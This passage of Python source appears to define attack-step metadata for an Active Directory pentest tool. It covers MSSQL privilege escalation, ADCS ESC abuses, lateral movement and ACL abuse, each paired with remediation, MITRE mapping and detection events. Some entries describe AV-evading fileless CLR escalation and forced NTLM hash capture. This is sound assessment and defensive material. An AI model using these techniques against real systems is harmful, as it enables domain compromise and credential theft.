        mitre_technique_name="Valid Accounts",
        detection_event_ids=("4624",),
        bh_native=True,
        bh_cypher_names=("SQLAdmin",),
        execution_target_access_requirement="computer_reachable",
    ),
    # ── MSSQL post-exploitation escalation steps ──────────────────────────────
    # These steps are emitted live during adscan mssql takeover execution.
    # They connect a SQLAdmin node to a SystemCompromise node on the same host.
    # technique_variant (pentester-facing) is stored in evidence; the step
    # relation itself (client-facing) is the same regardless of technique.
    _entry(
        "mssql_seimpersonate_escalation",
        support_kind="supported",
        support_reason=(
            "MSSQL sysadmin with SeImpersonatePrivilege → SYSTEM via CLR potato chain "
            "(GodPotato RPCSS coercion on WS2019, SweetPotato DCOM/BITS on WS2016). "
            "Bypasses Defender write-time scan: assembly bytes loaded as T-SQL hex, no PE on disk."
        ),
        compromise_semantics="direct_target_compromise",
        compromise_effort="low",
        category="privilege",
        description=(
            "The SQL Server service account's SeImpersonatePrivilege allows escalating "
            "to NT AUTHORITY\\SYSTEM on the database server via a CLR stored procedure. "
            "No file is written to disk: the exploit assembly is loaded directly into "
            "SQL Server memory as a hexadecimal literal, bypassing AV write-time scanning."
        ),
        remediation_complexity="medium",
        remediation_effort=(
            "Remove SeImpersonatePrivilege from the SQL Server service account "
            "(configure the service to run as a least-privilege named account rather than "
            "NETWORK SERVICE or LocalSystem). Note: even after removal, the token theft "
            "technique (MssqlTokenTheftEscalation) may still apply. See that step."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1134.001",
        mitre_technique_name="Access Token Manipulation: Token Impersonation/Theft",
        detection_event_ids=("4688", "7045"),
        bh_native=False,
        bh_cypher_names=("MssqlSeImpersonateEscalation",),
        execution_target_access_requirement="computer_reachable",
        # Post-ex escalation that runs THROUGH the XpCmdshell RCE channel — must
        # chain only AFTER XpCmdshell on the same host, never directly off the
        # MssqlLinkedServerLateral / SQLAdmin arrival. XpCmdshell is the sole
        # producer of ``mssql_rce_session``.
        source_context_requirement="mssql_rce_session",
    ),
    _entry(
        "mssql_token_theft_escalation",
        support_kind="supported",
        support_reason=(
            "MSSQL sysadmin WITHOUT SeImpersonatePrivilege → SYSTEM via shared logon session "
            "token recovery (Forshaw 2020). The stored service startup token in LSASS retains "
            "SeImpersonatePrivilege even when the process token has been stripped. "
            "Recovery uses SMB loopback named pipe auth: kernel authenticates with stored token, "
            "then GodPotato RPCSS coercion escalates to SYSTEM."
        ),
        compromise_semantics="direct_target_compromise",
        compromise_effort="low",
        category="privilege",
        description=(
            "Even when SeImpersonatePrivilege has been removed from the SQL Server process token "
            "(a common hardening measure), the original service startup token stored in LSASS "
            "retains the privilege. A CLR stored procedure recovers this token via SMB loopback "
            "named pipe authentication (Forshaw shared logon session technique) and escalates "
            "to NT AUTHORITY\\SYSTEM. This bypass is architectural. Removing the privilege from "
            "the process token is insufficient."
        ),
        remediation_complexity="high",
        remediation_effort=(
            "Run the SQL Server service as a dedicated named service account (not NETWORK SERVICE "
            "or LocalSystem) with a fresh, isolated logon session. Ensure the account has the "
            "minimum required privileges and is not shared with other services. "
            "Additionally, consider Windows Defender Credential Guard to protect stored tokens, "
            "and audit SMB loopback connections (\\\\localhost\\pipe\\*) for unusual authentication."
        ),
        can_fully_mitigate=False,
        mitre_technique_id="T1134.001",
        mitre_technique_name="Access Token Manipulation: Token Impersonation/Theft",
        detection_event_ids=("4688", "7045", "5145"),
        bh_native=False,
        bh_cypher_names=("MssqlTokenTheftEscalation",),
        execution_target_access_requirement="computer_reachable",
        # Post-ex escalation that runs THROUGH the XpCmdshell RCE channel — must
        # chain only AFTER XpCmdshell on the same host, never directly off the
        # MssqlLinkedServerLateral / SQLAdmin arrival. XpCmdshell is the sole
        # producer of ``mssql_rce_session``.
        source_context_requirement="mssql_rce_session",
    ),
    _entry(
        "mssql_linked_server_lateral",
        # CONTEXT at execution level — the linked-server hop is not a discrete
        # executable action; it is a SQL-session pivot that the DOWNSTREAM step
        # consumes (the XpCmdshell/escalation step runs its T-SQL "AT [link]").
        # So the execution engine passes through it, exactly like MemberOf /
        # LocalAdminPassReuse (which are also real capabilities marked context).
        # It stays an EdgeKind.AUTH edge + a real finding with its own narrative /
        # remediation (the over-privileged login mapping); only its EXECUTION is
        # subsumed by the next step.
        support_kind="context",
        support_reason=(
            "MSSQL linked server: a login on the source instance runs Transact-SQL "
            "on a second instance through the configured login mapping. The lateral "
            "hop itself is not executed as a standalone action — the downstream "
            "MSSQL execution step (e.g. xp_cmdshell) routes its statement through the "
            "link. The finding is the linked-server login mapping to a privileged "
            "remote account."
        ),
        compromise_semantics="access_capability_only",
        compromise_effort="low",
        category="lateral_movement",
        description=(
            "A SQL Server linked server relationship allows an attacker with sysadmin "
            "access on the source instance to execute arbitrary SQL on a second SQL Server "
            "instance (the linked target). This effectively extends the attack surface: "
            "each linked server hop can be chained with local privilege escalation "
            "(SeImpersonate or token theft) to achieve SYSTEM on additional hosts."
        ),
        remediation_complexity="medium",
        remediation_effort=(
            "Audit and remove unnecessary linked server relationships "
            "(sp_droplinkedsrvlogin / sp_dropserver). "
            "If linked servers are required, restrict the linked server login to the minimum "
            "necessary permissions (avoid sysadmin mapping). "
            "Use Windows Authentication with a dedicated low-privilege service account "
            "rather than 'Be Made Using the Login's Current Security Context'."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1210",
        mitre_technique_name="Exploitation of Remote Services",
        detection_event_ids=("4624", "4648"),
        bh_native=False,
        bh_cypher_names=("MssqlLinkedServerLateral",),
        execution_target_access_requirement="computer_reachable",
    ),
    _entry(
        "xp_cmdshell",
        support_kind="supported",
        support_reason=(
            "Sysadmin on the SQL instance (directly, or as the mapped sysadmin login "
            "of a linked server) allows enabling and running xp_cmdshell to execute "
            "operating-system commands under the SQL Server service account."
        ),
        compromise_semantics="direct_target_compromise",
        compromise_effort="low",
        category="execution",
        description=(
            "The SQL Server service can execute operating-system commands on its host "
            "when a session holds sysadmin. Any principal that reaches sysadmin on the "
            "instance — a direct sysadmin login, or a linked-server login mapping that "
            "lands as a sysadmin login on the remote instance — can therefore run "
            "commands on the host as the SQL Server service account, a full host "
            "code-execution capability."
        ),
        remediation_complexity="low",
        remediation_effort=(
            "Disable OS command execution on the instance: "
            "EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE. "
            "Restrict sysadmin membership to the minimum set of accounts, and run the "
            "SQL Server service under a low-privilege account. "
            "For linked servers, map the remote login to a least-privilege account "
            "rather than a sysadmin login."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1059",
        mitre_technique_name="Command and Scripting Interpreter",
        detection_event_ids=("4688", "15457"),
        bh_native=False,
        bh_cypher_names=("XpCmdshell",),
        execution_target_access_requirement="computer_reachable",
        # XpCmdshell establishes the OS-command RCE channel on the SQL host. The
        # MSSQL SYSTEM-escalation follow-ups (SeImpersonate / token-theft) run
        # THROUGH this channel and are recorded only after it, so they require
        # this produced context — which stops them from chaining directly off the
        # MssqlLinkedServerLateral / SQLAdmin arrival as a sibling of XpCmdshell.
        provides_context="mssql_rce_session",
    ),
    _entry(
        "mssql_openrowset_bulk_read",
        support_kind="supported",
        support_reason=(
            "ADMINISTER BULK OPERATIONS on the SQL instance (sysadmin, the "
            "bulkadmin fixed server role, or an explicit grant — directly, or "
            "as the mapped login of a linked server) allows reading arbitrary "
            "files the SQL Server service account can reach, without any "
            "operating-system command-execution surface."
        ),
        compromise_semantics="credential_access_only",
        compromise_effort="low",
        category="collection",
        description=(
            "SQL Server can read the raw content of any file the SQL Server "
            "service account can access on its host, without executing a "
            "single operating-system command. Any principal holding ADMINISTER "
            "BULK OPERATIONS — sysadmin, the bulkadmin fixed server role, an "
            "explicit grant, or a linked-server login mapping that lands on the "
            "same permission remotely — can pull configuration files, backup "
            "files, and scripts off the host and recover any credentials or "
            "connection strings stored in them."
        ),
        remediation_complexity="low",
        remediation_effort=(
            "Revoke the permission from logins that do not need it: "
            "REVOKE ADMINISTER BULK OPERATIONS FROM [login]; "
            "and remove unnecessary membership from the bulkadmin fixed server "
            "role: ALTER SERVER ROLE bulkadmin DROP MEMBER [login]. "
            "Restrict sysadmin membership to the minimum set of accounts, and "
            "run the SQL Server service under a low-privilege account so a "
            "file read through this avenue exposes as little as possible. "
            "For linked servers, map the remote login to a least-privilege "
            "account rather than one with ADMINISTER BULK OPERATIONS or "
            "sysadmin."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1005",
        mitre_technique_name="Data from Local System",
        detection_event_ids=("15457",),
        bh_native=False,
        bh_cypher_names=("MssqlOpenRowsetBulkRead",),
        execution_target_access_requirement="computer_reachable",
    ),
    _entry(
        "mssql_impersonate_login",
        support_kind="supported",
        support_reason=(
            "EXECUTE AS LOGIN privilege on a high-priv login (e.g. sa) confirmed via "
            "native TDS query; xp_cmdshell enabled and OS command executed under the "
            "impersonated identity. Classic GOAD path: samwell.tarly → EXECUTE AS LOGIN='sa'."
        ),
        compromise_semantics="direct_target_compromise",
        compromise_effort="low",
        category="privilege",
        description=(
            "A low-privilege SQL login that has been granted IMPERSONATE rights on a "
            "higher-privileged login (e.g. 'sa') can assume that identity within the "
            "SQL Server session using EXECUTE AS LOGIN. This effectively grants sysadmin "
            "access, enabling xp_cmdshell execution, CLR assembly loading, and all other "
            "sysadmin capabilities, without knowing the target login's password."
        ),
        remediation_complexity="low",
        remediation_effort=(
            "Revoke the IMPERSONATE grant: "
            "REVOKE IMPERSONATE ON LOGIN::[target] FROM [grantee]. "
            "Audit all IMPERSONATE grants with: "
            "SELECT grantee_principal_name, entity_name FROM sys.server_permissions "
            "WHERE permission_name = 'IMPERSONATE'."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1078.002",
        mitre_technique_name="Valid Accounts: Domain Accounts",
        detection_event_ids=("33205",),
        bh_native=False,
        bh_cypher_names=("MssqlImpersonateLogin",),
        execution_target_access_requirement="computer_reachable",
    ),
    _entry(
        "mssql_trustworthy_db_escalation",
        support_kind="supported",
        support_reason=(
            "TRUSTWORTHY database owned by sysadmin found; EXECUTE AS USER = 'dbo' "
            "within that database grants effective sysadmin. Confirmed via "
            "IS_SRVROLEMEMBER('sysadmin') check. Classic GOAD path: "
            "arya.stark → USE msdb; EXECUTE AS USER='dbo' → sysadmin."
        ),
        compromise_semantics="direct_target_compromise",
        compromise_effort="low",
        category="privilege",
        description=(
            "A TRUSTWORTHY database owned by a sysadmin account allows any user with "
            "db_owner rights (or EXECUTE AS USER='dbo') to escalate to effective sysadmin "
            "server-wide. When EXECUTE AS USER impersonates the database owner context "
            "inside a TRUSTWORTHY database, SQL Server grants server-level permissions "
            "equivalent to the database owner's server role, giving sysadmin access to "
            "any db_owner in that database."
        ),
        remediation_complexity="low",
        remediation_effort=(
            "Disable TRUSTWORTHY on all non-system databases: "
            "ALTER DATABASE [dbname] SET TRUSTWORTHY OFF. "
            "For msdb, ensure no untrusted users have db_owner rights. "
            "Audit with: SELECT name, is_trustworthy_on FROM sys.databases "
            "WHERE is_trustworthy_on = 1 AND name NOT IN ('msdb','model','tempdb','master')."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1078.002",
        mitre_technique_name="Valid Accounts: Domain Accounts",
        detection_event_ids=("33205",),
        bh_native=False,
        bh_cypher_names=("MssqlTrustworthyDbEscalation",),
        execution_target_access_requirement="computer_reachable",
    ),
    _entry(
        "mssql_ntlmv2_theft",
        support_kind="supported",
        support_reason=(
            "xp_dirtree or similar built-in stored procedure forced to authenticate "
            "to an attacker-controlled SMB server, capturing the SQL service account's "
            "NTLMv2 hash for offline cracking or relay."
        ),
        compromise_semantics="access_capability_only",
        compromise_effort="medium",
        category="credential_access",
        description=(
            "A SQL sysadmin (or any user with EXECUTE rights on xp_dirtree / xp_fileexist) "
            "can force the SQL Server service account to authenticate to an attacker-controlled "
            "SMB share, capturing its NTLMv2 response hash. If the service account is "
            "a domain user, the hash can be cracked offline or relayed to authenticate "
            "as that account on other network resources."
        ),
        remediation_complexity="medium",
        remediation_effort=(
            "Restrict outbound SMB from SQL Server hosts via firewall rules (block TCP 445 "
            "outbound). Revoke EXECUTE on xp_dirtree, xp_fileexist, xp_subdirs from "
            "non-sysadmin roles. Run SQL Server under a Managed Service Account (MSA) or "
            "gMSA whose password cannot be cracked. "
            "Enable Extended Protection for Authentication on IIS/SMB to block relay."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1557.001",
        mitre_technique_name="Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay",
        detection_event_ids=("4624", "4648", "5145"),
        bh_native=False,
        bh_cypher_names=("MssqlNtlmv2Theft",),
        execution_target_access_requirement="computer_reachable",
    ),
    _entry(
        "canrdp",
        support_kind="supported",
        support_reason="Confirm RDP login capability (CanRDP)",
        compromise_semantics="access_capability_only",
        compromise_effort="medium",
        category="lateral_movement",
        description="Interactive login capability via RDP",
        remediation_complexity="medium",
        remediation_effort=(
            "Remove the principal from the Remote Desktop Users group on target hosts. "
            "Restrict RDP access via GPO and firewall rules."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1021.001",
        mitre_technique_name="Remote Services: Remote Desktop Protocol",
        detection_event_ids=("4624", "4778"),
        bh_native=True,
        bh_cypher_names=("CanRDP",),
        execution_target_access_requirement="computer_reachable",
    ),
    _entry(
        "canpsremote",
        support_kind="supported",
        support_reason="Confirm remote PowerShell/WinRM capability (CanPSRemote)",
        compromise_semantics="access_capability_only",
        compromise_effort="medium",
        category="lateral_movement",
        description="Remote command execution capability over WinRM/PowerShell",
        remediation_complexity="medium",
        remediation_effort=(
            "Remove the principal from the Remote Management Users group on target hosts. "
            "Restrict WinRM access via GPO and firewall rules."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1021.006",
        mitre_technique_name="Remote Services: Windows Remote Management",
        detection_event_ids=("4624",),
        bh_native=True,
        bh_cypher_names=("CanPSRemote",),
        execution_target_access_requirement="computer_reachable",
    ),
    _entry(
        "guestsession",
        support_kind="supported",
        support_reason="Enumerate SMB guest-authenticated shares and permissions",
        category="lateral_movement",
        description="Guest SMB session accepted, enabling unauthenticated share access",
        vuln_key="smb_guest_shares",
        remediation_complexity="low",
        remediation_effort=(
            "Disable guest SMB access and null sessions via GPO. "
            "Require authenticated SMB access and remove anonymous share permissions."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1135",
        mitre_technique_name="Network Share Discovery",
        detection_event_ids=("4624", "5140"),
        bh_cypher_names=("GuestSession",),
    ),
    _entry(
        "executedcom",
        support_kind="unsupported",
        support_reason="Not implemented yet in ADscan",
        category="lateral_movement",
        description="Remote command execution capability over DCOM",
        remediation_complexity="medium",
        remediation_effort=(
            "Remove DCOM permissions from non-privileged principals via DCOMCNFG "
            "or registry ACL hardening on target hosts."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1021.003",
        mitre_technique_name="Remote Services: Distributed Component Object Model",
        detection_event_ids=("4624", "4688"),
        bh_native=True,
        bh_cypher_names=("ExecuteDCOM",),
        execution_target_access_requirement="computer_reachable",
    ),
    # ── ADCS / PKI ──────────────────────────────────────────────────────────
    _entry(
        "adcsesc1",
        support_kind="supported",
        support_reason="Request an authentication certificate via ADCS ESC1",
        compromise_semantics="direct_target_compromise",
        compromise_effort="high",
        category="adcs",
        description="Enroll exploitable template and authenticate as target",
        vuln_key="adcs_esc1",
        remediation_complexity="medium",
        remediation_effort=(
            "Disable CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT on the certificate template, "
            "or restrict enrollment to specific privileged security groups."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1649",
        mitre_technique_name="Steal or Forge Authentication Certificates",
        detection_event_ids=("4886", "4887"),
        bh_native=True,
        bh_cypher_names=("ADCSESC1",),
    ),
    _entry(
        "adcsesc2",
        support_kind="supported",
        support_reason="Native async enrollment-agent chain via MS-ICPR",
        compromise_semantics="direct_target_compromise",
        compromise_effort="high",
        category="adcs",
        description="ADCS ESC2 privilege escalation path",
        vuln_key="adcs_esc2",
        remediation_complexity="medium",
        remediation_effort=(
            "Remove Any Purpose EKU or CA issuance rights from the template. "
            "Enable CA manager approval for issuance."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1649",
        mitre_technique_name="Steal or Forge Authentication Certificates",
        detection_event_ids=("4886", "4887"),
        bh_native=False,
        bh_cypher_names=("ADCSESC2",),
    ),
    _entry(
        "adcsesc3",
        support_kind="supported",
        support_reason="Request an agent certificate and impersonate a target via ADCS ESC3",
        compromise_semantics="direct_target_compromise",
        compromise_effort="high",
        category="adcs",
        description="Use enrollment agent cert to request impersonation certs",
        vuln_key="adcs_esc3",
        remediation_complexity="medium",
        remediation_effort=(
            "Remove enrollment agent rights from the template or restrict "
            "to a dedicated enrollment agent account with auditing and approval workflow."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1649",
        mitre_technique_name="Steal or Forge Authentication Certificates",
        detection_event_ids=("4886", "4887"),
        bh_native=True,
        bh_cypher_names=("ADCSESC3",),
    ),
    _entry(
        "adcsesc4",
        support_kind="supported",
        support_reason="Make a certificate template vulnerable via ADCS ESC4",
        compromise_semantics="direct_target_compromise",
        compromise_effort="high",
        category="adcs",
        description="Modify template permissions/configuration for abuse",
        vuln_key="adcs_esc4",
        remediation_complexity="medium",
        remediation_effort=(
            "Remove GenericWrite/WriteDACL/WriteOwner permissions from "
            "non-privileged principals on the certificate template AD object."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1649",
        mitre_technique_name="Steal or Forge Authentication Certificates",
        detection_event_ids=("5136", "4886", "4887"),
        bh_native=True,
        bh_cypher_names=("ADCSESC4",),
    ),
    _entry(
        "adcsesc5",
        support_kind="supported",
        support_reason=(
            "Native CA private-key backup and offline certificate forge, with full "
            "environment-change disclosure of the exfiltrated CA key, the forged "
            "certificate, and the transient host artifacts"
        ),
        compromise_semantics="direct_target_compromise",
        compromise_effort="high",
        category="adcs",
        description="ADCS ESC5 privilege escalation path",
        vuln_key="adcs_esc5",
        remediation_complexity="medium",
        remediation_effort=(
            "Restrict ACL permissions on CA objects and PKI containers in AD. "
            "Remove non-privileged write access to CA configuration objects."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1649",
        mitre_technique_name="Steal or Forge Authentication Certificates",
        detection_event_ids=("5136", "4886", "4887"),
        bh_native=False,
        bh_cypher_names=("ADCSESC5",),
    ),
    _entry(
        "adcsesc6",
        support_kind="supported",
        support_reason="Native async EDITF_ATTRIBUTESUBJECTALTNAME2 exploitation",
        compromise_semantics="direct_target_compromise",
        compromise_effort="high",
        category="adcs",
        description="ADCS ESC6 privilege escalation path",
        vuln_key="adcs_esc6",
        remediation_complexity="high",
        remediation_effort=(
            "Remove EDITF_ATTRIBUTESUBJECTALTNAME2 flag from the CA via certutil. "
            "Requires CA service restart and testing. May break applications using this flag."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1649",
        mitre_technique_name="Steal or Forge Authentication Certificates",
        detection_event_ids=("4886", "4887"),
        bh_native=True,
        bh_cypher_names=("ADCSESC6a", "ADCSESC6b"),
    ),
    _entry(
        "adcsesc7",
        support_kind="supported",
        support_reason="Native async ManageCA via LDAP then SubCA cert request",
        compromise_semantics="direct_target_compromise",
        compromise_effort="high",
        category="adcs",
        description="ADCS ESC7 privilege escalation path",
        vuln_key="adcs_esc7",
        remediation_complexity="high",
        remediation_effort=(
            "Remove the ManageCA or ManageCertificates rights from non-privileged principals. "
            "Audit CA officer and manager role assignments."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1649",
        mitre_technique_name="Steal or Forge Authentication Certificates",
        detection_event_ids=("4886", "4887"),
        bh_native=False,
        bh_cypher_names=("ADCSESC7",),
    ),
    _entry(
        "adcsesc8",
        support_kind="supported",
        support_reason="Native async coercion plus SMB-to-HTTP ADCS relay",
        compromise_semantics="direct_target_compromise",
        compromise_effort="high",
        category="adcs",
        description="ADCS ESC8 privilege escalation path",
        vuln_key="adcs_esc8",
        remediation_complexity="high",
        remediation_effort=(
            "Enforce HTTPS on all CA web enrollment endpoints. "
            "Enable Extended Protection for Authentication (EPA) on IIS. "
            "Disable HTTP enrollment. May require IIS and CA reconfiguration."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1649",
        mitre_technique_name="Steal or Forge Authentication Certificates",
        detection_event_ids=("4886", "4887"),
        bh_native=False,
        bh_cypher_names=("ADCSESC8",),
        execution_relation_alias="coerceandrelayntlmtoadcs",
    ),
    _entry(
        "adcsesc9",
        support_kind="supported",
        support_reason="Native async UPN manipulation via LDAP + shadow credentials chain",
        compromise_semantics="direct_target_compromise",
        compromise_effort="high",
        category="adcs",
        description="ADCS ESC9 privilege escalation path",
        vuln_key="adcs_esc9",
        remediation_complexity="high",
        remediation_effort=(
            "Deploy KB5014754 and set StrongCertificateBindingEnforcement=2 on all DCs. "
            "Restrict write access to UPN attributes. "
            "Requires thorough testing before full enforcement."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1649",
        mitre_technique_name="Steal or Forge Authentication Certificates",
        detection_event_ids=("5136", "4886", "4887"),
        bh_native=True,
        bh_cypher_names=("ADCSESC9a", "ADCSESC9b"),
    ),
    _entry(
        "adcsesc10",
        support_kind="unsupported",
        support_reason="Not implemented yet in ADscan",
        compromise_semantics="direct_target_compromise",
        compromise_effort="high",
        category="adcs",
        description="ADCS ESC10 privilege escalation path",
        vuln_key="adcs_esc10",
        remediation_complexity="high",
        remediation_effort=(
            "Set StrongCertificateBindingEnforcement=2 on all DCs. "
            "Remove registry compat mode. May break legacy certificate-based auth."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1649",
        mitre_technique_name="Steal or Forge Authentication Certificates",
        detection_event_ids=("4886", "4887"),
        bh_native=True,
        bh_cypher_names=("ADCSESC10a", "ADCSESC10b"),
    ),
    _entry(
        "adcsesc11",
        support_kind="supported",
        support_reason="Native async coercion plus SMB-to-RPC ADCS relay",
        compromise_semantics="direct_target_compromise",
        compromise_effort="high",
        category="adcs",
        description="ADCS ESC11 privilege escalation path",
        vuln_key="adcs_esc11",
        remediation_complexity="high",
        remediation_effort=(
            "Enforce HTTPS and EPA on ICPR/RPC endpoint for the CA. "
            "Disable insecure transport for certificate enrollment."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1649",
        mitre_technique_name="Steal or Forge Authentication Certificates",
        detection_event_ids=("4886", "4887"),
        bh_native=False,
        bh_cypher_names=("ADCSESC11",),
    ),
    _entry(
        "adcsesc13",
        support_kind="supported",
        support_reason="Enrolls a certificate from the abusable template, then authenticates with the linked group membership.",
        compromise_semantics="direct_target_compromise",
        compromise_effort="high",
        category="adcs",
        description="ADCS ESC13 effective linked-group membership path",
        vuln_key="adcs_esc13",
        remediation_complexity="medium",
        remediation_effort=(
            "Remove OID group link from the issuance policy on the template, "
            "or restrict enrollment rights to prevent unauthorized group membership acquisition."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1649",
        mitre_technique_name="Steal or Forge Authentication Certificates",
        detection_event_ids=("4886", "4887"),
        bh_native=True,
        bh_cypher_names=("ADCSESC13",),
    ),
    _entry(
        "adcsesc14",
        support_kind="supported",
        support_reason="Native async altSecurityIdentities X509 binding write",
        compromise_semantics="direct_target_compromise",
        compromise_effort="high",
        category="adcs",
        description="ADCS ESC14 privilege escalation path",
        vuln_key="adcs_esc14",
        remediation_complexity="high",
        remediation_effort=(
            "Remove weak explicit certificate mappings from altSecurityIdentities, "
            "and enforce strong certificate binding."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1649",
        mitre_technique_name="Steal or Forge Authentication Certificates",
        detection_event_ids=("5136", "4886", "4887"),
        bh_native=False,
        bh_cypher_names=("ADCSESC14",),
    ),
    _entry(
        "adcsesc15",
        support_kind="supported",
        support_reason="Native async application-policy OID injection enrollment chain",
        compromise_semantics="direct_target_compromise",
        compromise_effort="high",
        category="adcs",
        description="ADCS ESC15 privilege escalation path",
        vuln_key="adcs_esc15",
        remediation_complexity="medium",
        remediation_effort=(
            "Upgrade the certificate template schema version to v2 or higher, "
            "which requires explicit EKU specification and prevents schema-v1 authentication abuse."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1649",
        mitre_technique_name="Steal or Forge Authentication Certificates",
        detection_event_ids=("4886", "4887"),
        bh_native=False,
        bh_cypher_names=("ADCSESC15",),
    ),
    _entry(
        "adcsesc16",
        support_kind="unsupported",
        support_reason="Not implemented yet in ADscan",
        compromise_semantics="direct_target_compromise",
        compromise_effort="high",
        category="adcs",
        description="ADCS ESC16 privilege escalation path",
        vuln_key="adcs_esc16",
        remediation_complexity="high",
        remediation_effort=(
            "Re-enable szOID_NTDS_CA_SECURITY_EXT on the CA and enforce strong "
            "certificate binding on domain controllers."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1649",
        mitre_technique_name="Steal or Forge Authentication Certificates",
        detection_event_ids=("4886", "4887"),
        bh_native=False,
        bh_cypher_names=("ADCSESC16",),
    ),
    _entry(
        "adcsesc17",
        support_kind="unsupported",
        support_reason="Not implemented yet in ADscan",
        compromise_semantics="indirect_target_compromise",
        compromise_effort="high",
        category="adcs",
        description="ADCS ESC17 privilege escalation path",
        vuln_key="adcs_esc17",
        remediation_complexity="high",
        remediation_effort=(
            "Restrict enrollment on Server Authentication templates and disable "
            "enrollee-supplied subject names where not strictly required."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1557",
        mitre_technique_name="Adversary-in-the-Middle",
        detection_event_ids=("4886", "4887"),
        bh_native=False,
        bh_cypher_names=("ADCSESC17",),
    ),
    _entry(
        "coerceandrelayntlmtoadcs",
        support_kind="supported",
        support_reason="Native async coercion plus ADCS NTLM relay",
        compromise_semantics="direct_target_compromise",
        compromise_effort="high",
        category="adcs",
        description="Coerce NTLM authentication and relay it to ADCS endpoints",
        remediation_complexity="high",
        remediation_effort=(
            "Enable EPA on all ADCS HTTP endpoints. Enforce HTTPS. "
            "Block coercion techniques at the firewall (disable vulnerable RPC services on DCs)."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1187",
        mitre_technique_name="Forced Authentication",
        detection_event_ids=("4768",),
        bh_native=True,
        bh_cypher_names=("CoerceAndRelayNTLMToADCS",),
    ),
    # ── ACL / Object control ─────────────────────────────────────────────────
    _entry(
        "genericall",
        support_kind="supported",
        support_reason="ACL/ACE abuse (GenericAll)",
        compromise_semantics="direct_target_compromise",
        compromise_effort="immediate",
        category="acl_ace",
        description="Full object control over target principal/object",
        remediation_complexity="medium",
        remediation_effort=(
            "Remove the GenericAll ACE from the target object's ACL: inspect it with "
            "`dsacls \"<targetDN>\"` (or `(Get-Acl \"AD:\\<targetDN>\").Access`), then strip the "
            "offending entry with `dsacls \"<targetDN>\" /R \"<DOMAIN\\principal>\"`. Audit AD ACLs "
            "regularly with the native `Get-Acl`/`dsacls` tooling and enforce least-privilege "
            "delegation — grant only the specific rights required (Delegation of Control wizard or "
            "scoped ACEs), never full control."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1098",
        mitre_technique_name="Account Manipulation",
        detection_event_ids=("5136", "4662"),
        bh_native=True,
        bh_cypher_names=("GenericAll",),
        is_acl_edge=True,
    ),
    _entry(
        "genericwrite",
        support_kind="supported",
        support_reason="ACL/ACE abuse (GenericWrite)",
        compromise_semantics="direct_target_compromise",
        compromise_effort="low",
        category="acl_ace",
        description="Write permissions over target object attributes",
        remediation_complexity="medium",
        remediation_effort=(
            "Remove the GenericWrite ACE from the target object's ACL: inspect it with "
            "`dsacls \"<targetDN>\"` (or `(Get-Acl \"AD:\\<targetDN>\").Access`), then strip the "
            "offending entry with `dsacls \"<targetDN>\" /R \"<DOMAIN\\principal>\"`. Grant back "
            "only the specific attributes the delegation needs (`dsacls ... /G "
            "\"<DOMAIN\\group>:WP;<attribute>\"`), never write access to the whole object — "
            "msDS-KeyCredentialLink, servicePrincipalName and "
            "msDS-AllowedToActOnBehalfOfOtherIdentity each hand over the account on their own. "
            "Clear anything already written to those three attributes before removing the ACE, "
            "or the takeover survives the fix."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1098",
        mitre_technique_name="Account Manipulation",
        detection_event_ids=("5136",),
        bh_native=True,
        bh_cypher_names=("GenericWrite",),
        is_acl_edge=True,
    ),
    _entry(
        "owns",
        support_kind="supported",
        support_reason="ACL/ACE abuse (Owns → dacledit FullControl → target-specific chain)",
        compromise_semantics="direct_target_compromise",
        compromise_effort="immediate",
        category="acl_ace",
        description="Object ownership grants implicit GenericAll-equivalent rights",
        remediation_complexity="medium",
        remediation_effort=(
            "Transfer object ownership to Domain Admins or SYSTEM. "
            "Audit ownership of high-value objects (GPOs, OUs, user/computer accounts)."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1222.001",
        mitre_technique_name="Windows File and Directory Permissions Modification",
        detection_event_ids=("4662",),
        bh_native=True,
        bh_cypher_names=("Owns",),
        is_acl_edge=True,
    ),
    _entry(
        "forcechangepassword",
        support_kind="supported",
        support_reason="ACL/ACE abuse (ForceChangePassword)",
        compromise_semantics="direct_target_compromise",
        compromise_effort="immediate",
        category="acl_ace",
        description="Reset target account password without current password",
        vuln_key="force_change_password",
        remediation_complexity="low",
        remediation_effort=(
            "Remove ForceChangePassword (User-Force-Change-Password extended right) "
            "from the target user's ACL for non-privileged principals."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1098",
        mitre_technique_name="Account Manipulation",
        detection_event_ids=("4723", "4724"),
        bh_native=True,
        bh_cypher_names=("ForceChangePassword",),
        is_acl_edge=True,
    ),
    _entry(
        "addself",
        support_kind="supported",
        support_reason="ACL/ACE abuse (AddSelf)",
        compromise_semantics="direct_target_compromise",
        compromise_effort="low",
        category="acl_ace",
        description="Self-add to controlled group under permissive ACL",
        remediation_complexity="low",
